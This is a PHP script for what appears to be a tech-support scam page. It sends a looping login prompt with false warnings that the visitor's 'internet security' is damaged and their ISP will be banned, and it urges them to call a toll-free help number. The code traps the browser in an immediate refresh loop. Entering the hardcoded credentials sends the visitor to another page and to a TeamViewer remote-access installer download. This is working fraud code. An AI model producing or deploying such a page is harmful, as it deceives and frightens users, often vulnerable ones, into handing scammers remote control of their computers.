<?php

    session_start();

    $_user = 'windows2016';
    $_password = 'microsoft';

    if ($_SERVER['PHP_AUTH_USER'] != $_user || $_SERVER['PHP_AUTH_PW'] != $_password ) {

        if(isset($_SESSION['login_attempts'])){ $_SESSION['login_attempts']++; }else{$_SESSION['login_attempts'] = 3;}

        if($_SESSION['login_attempts'] == 80){
            header('Location: ffdd22yy.php');
            exit;
        } else {

           header('WWW-Authenticate: Basic realm="Protected Page: Enter your Network username and password wrong password closed internet connection and ban your ISP call on  @ +1-888-888-8888 (Toll Free) " for access."');
           header('HTTP/1.0 401 Unauthorized');
$page = $_SERVER['PHP_SELF'];
 $sec = "0";
 header("Refresh: $sec; url=$page");
         echo "<html><head><title>Internet Security Damaged !!! Call Help Desk</title></head><body>";


            exit;
        }
    } else {

        header('Location: ffdd22yy.php');
        header('Location: http://download.teamviewer.com/download/TeamViewer_Setup_en.exe');

        exit;
    }
?>
